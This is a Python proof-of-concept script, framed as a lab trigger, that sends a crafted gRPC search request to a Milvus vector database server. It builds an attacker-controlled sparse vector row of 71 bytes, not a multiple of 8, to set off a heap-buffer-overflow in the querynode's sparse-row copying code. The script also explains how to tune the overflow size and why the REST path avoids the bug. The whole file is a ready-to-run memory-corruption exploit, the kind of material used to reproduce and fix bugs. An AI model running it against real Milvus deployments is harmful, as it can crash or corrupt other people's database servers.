#!/usr/bin/env python3
"""Lab trigger: Search with a SparseFloatVector PlaceholderGroup row whose len % 8 != 0.

REST/JSON search cannot do this — the HTTP layer re-encodes maps into 8-aligned
rows. gRPC can send raw placeholder bytes, which is what hits CopyAndWrapSparseRow.

Usage (against a running Milvus; no Milvus compile required):

  pip install pymilvus
  python3 sparse_search_trigger.py --host 127.0.0.1 --port 19530 \\
      --collection sparse_lab --anns-field vector

Expect: an error response and/or ASAN heap-buffer-overflow on an instrumented
querynode. A clean success with top-k hits means the request did not take the
vulnerable path (wrong field name / collection not sparse / already fixed).
"""

from __future__ import annotations

import argparse
import sys

from pymilvus.grpc_gen import common_pb2, milvus_pb2, milvus_pb2_grpc
import grpc


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=19530)
    ap.add_argument("--collection", default="sparse_lab")
    ap.add_argument("--anns-field", default="vector")
    ap.add_argument(
        "--size",
        type=int,
        default=71,
        help="sparse row byte length; use 8*N+7 (default 71) to overflow by 7",
    )
    args = ap.parse_args()

    if args.size % 8 == 0:
        print("size is multiple of 8; that will NOT exercise the overflow path", file=sys.stderr)
        return 2

    # Attacker-controlled sparse blob: length not divisible by element_size (8).
    bad_row = bytes([0x11]) * args.size

    ph = common_pb2.PlaceholderValue(
        tag="$0",
        type=common_pb2.PlaceholderType.SparseFloatVector,
        values=[bad_row],
    )
    phg = common_pb2.PlaceholderGroup(placeholders=[ph])

    req = milvus_pb2.SearchRequest(
        collection_name=args.collection,
        partition_names=[],
        dsl="",
        placeholder_group=phg.SerializeToString(),
        dsl_type=common_pb2.DslType.BoolExprV1,
        search_params=[
            common_pb2.KeyValuePair(key="anns_field", value=args.anns_field),
            common_pb2.KeyValuePair(key="topk", value="1"),
            common_pb2.KeyValuePair(key="metric_type", value="IP"),
            common_pb2.KeyValuePair(key="params", value="{}"),
        ],
        guarantee_timestamp=1,
        nq=1,
    )

    channel = grpc.insecure_channel(f"{args.host}:{args.port}")
    stub = milvus_pb2_grpc.MilvusServiceStub(channel)
    try:
        resp = stub.Search(req, timeout=30)
    except grpc.RpcError as e:
        print(f"RPC error: {e.code()} {e.details()}")
        return 1

    status = resp.status
    print(f"error_code={status.error_code} reason={status.reason!r}")
    print(f"results={len(resp.results.scores) if resp.results else 0} scores")
    # Bug present: usually a non-success status AFTER segcore already overflowed.
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
